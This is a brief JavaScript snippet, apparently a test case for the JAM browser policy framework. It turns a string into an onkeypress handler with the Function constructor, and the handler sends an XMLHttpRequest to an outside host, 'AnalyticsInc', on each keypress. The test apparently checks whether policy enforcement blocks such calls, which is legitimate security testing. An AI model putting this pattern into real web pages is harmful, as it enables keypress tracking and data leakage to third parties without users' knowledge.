introspect(JAM.policy.pFull) {
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onkeypress3", true);xmlhttp.send(null);';
document.getElementById("test").onkeypress = Function(exp);

}
